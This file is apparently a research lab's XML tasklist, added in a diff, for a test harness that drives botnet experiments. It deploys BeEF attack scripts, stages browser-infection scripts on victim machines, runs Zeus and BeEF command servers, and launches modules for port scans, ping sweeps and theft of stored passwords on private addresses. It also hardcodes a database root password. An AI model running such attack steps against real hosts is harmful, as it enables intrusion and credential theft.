@@ -1,0 +1,208 @@
+<?xml version="1.0" encoding="utf-8"?>
+<experiment>
+  
+  <description>botnet attack tasklist library</description>
+  
+  <!-- targets element still required for validity -->
+  <targets/>
+
+  <tasklists>
+    <tasklist name="beef-attack-preparation" on-error="stop-experiment">
+     <par>
+         <put>
+          <source>/home/ansii/gplmt_experiments/scripts/attacks/beef_attack.py</source>
+          <destination>beef_attack.py</destination>
+        </put>
+        <put>
+          <source>/home/ansii/gplmt_experiments/scripts/attacks/beefapi.py</source>
+          <destination>/usr/lib/python2.7/beefapi.py</destination>
+        </put>
+      </par>
+    </tasklist>
+
+    <tasklist name="beef-victim-preparation" on-error="stop-experiment">
+      <par>
+        <put>
+          <source>/home/ansii/gplmt_experiments/scripts/attacks/beef-infect.sh</source>
+          <destination>beef-infect.sh</destination>
+        </put>
+
+        <put>
+          <source>/home/ansii/gplmt_experiments/scripts/attacks/beef-infect-chrome.sh</source>
+          <destination>beef-infect-chrome.sh</destination>
+        </put>
+
+      </par>
+    </tasklist>
+
+    <tasklist name="start-zeuscc">
+      <seq>
+       <run>service apache2 start</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="stop-zeuscc">
+      <seq>
+       <run>service apache2 stop</run>
+       <run> mysql -uroot -pansii cpdb -e 'delete from botnet_list;'</run> <!-- remove the bot from the list of active bots -->
+      </seq>
+    </tasklist>
+
+    <tasklist name="start-beefcc">
+     <seq>
+       <run>/etc/init.d/beef start</run>
+     </seq>
+    </tasklist>
+
+    <tasklist name="start-beefcc-https">
+     <seq>
+       <run>/etc/init.d/beef-https start</run>
+     </seq>
+    </tasklist>
+
+
+    <tasklist name="stop-beefcc">
+     <seq>
+       <run>/etc/init.d/beef stop</run>
+     </seq>
+    </tasklist>
+
+
+    <tasklist name="stop-beefcc-https">
+     <seq>
+       <run>/etc/init.d/beef-https stop</run>
+     </seq>
+    </tasklist>
+
+    <tasklist name="beef-infect">
+      <seq>
+        <run>./beef-infect.sh</run>
+      </seq>
+    </tasklist>
+
+
+    <tasklist name="beef-https-infect">
+      <seq>
+        <run>./beef-infect.sh https</run>
+      </seq>
+    </tasklist>
+
+
+    <tasklist name="beef-infect-chrome">
+      <seq>
+        <run>./beef-infect-chrome.sh</run>
+      </seq>
+    </tasklist>
+
+
+    <tasklist name="beef-https-infect-chrome">
+      <seq>
+        <run>./beef-infect-chrome.sh https</run>
+      </seq>
+    </tasklist>
+
+
+   
+    <tasklist name="wait">
+      <seq>
+        <run>sleep 5</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="waitMinute">
+      <seq>
+        <run>sleep 60</run>
+      </seq>
+    </tasklist>
+
+
+    <tasklist name="zeus-start-victim">
+      <seq>
+       <run>xe vm-start vm=windows7-zeusvic</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="zeus-stop-victim">
+      <seq>
+       <run>shutdown -p</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-clean-victims">
+     <seq>
+       <run>taskkill /f /im firefox.exe</run>
+       <run>rm beef-infect.sh</run>
+       <run>rm beef-infect-chrome.sh</run>
+       <run>rm dump.cap</run>
+     </seq>
+    </tasklist>
+    
+    <tasklist name="beef-stop-firefox">
+      <seq>
+        <run>taskkill /f /im firefox.exe</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-stop-chrome">
+      <seq>
+         <run>taskkill /f /im chrome.exe</run>
+      </seq>
+    </tasklist>
+     
+    <tasklist name="beef-portscan">
+      <seq>
+        <run>./beef_attack.py --module 19 --params '{"ipHost":"172.16.151.1","ports":"80,443"}'</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-portscan-https">
+      <seq>
+        <run>./beef_attack.py --module 19 --params '{"ipHost":"172.16.151.1","ports":"80,443"}' --https</run>
+      </seq>
+    </tasklist>
+
+
+    <tasklist name="beef-detect-socialnetworks">
+      <seq>
+        <run>./beef_attack.py --module 33</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-detect-popupblocker">
+      <seq>
+        <run>./beef_attack.py --module 85</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-get-stored-pw">
+      <seq>
+        <run>./beef_attack.py --module 106 --params '{"login_url":"172.16.151.173/www.facebook.com/"}'</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-pingsweep">
+      <seq>
+        <run>./beef_attack.py --module 29 --params '{"ipRange":"172.16.151.1-172.16.151.20"}'</run>
+      </seq>
+    </tasklist>
+
+    <tasklist name="beef-pingsweep-https">
+      <seq>
+        <run>./beef_attack.py --module 29 --params '{"ipRange":"172.16.151.1-172.16.151.20"}' --https</run>
+      </seq>
+    </tasklist>
+
+
+    <tasklist name="beef-remove-scripts">
+     <par>
+       <run>rm /root/beef_attack.py</run>
+       <!-- remove beefapi.py and beefapi.pyc from python module path -->
+       <run>rm /usr/lib/python2.7/beefapi.py*</run>
+     </par>
+    </tasklist>
+  </tasklists>
+
+  <!-- steps element still required for validity -->
+  <steps/>
+
+</experiment>
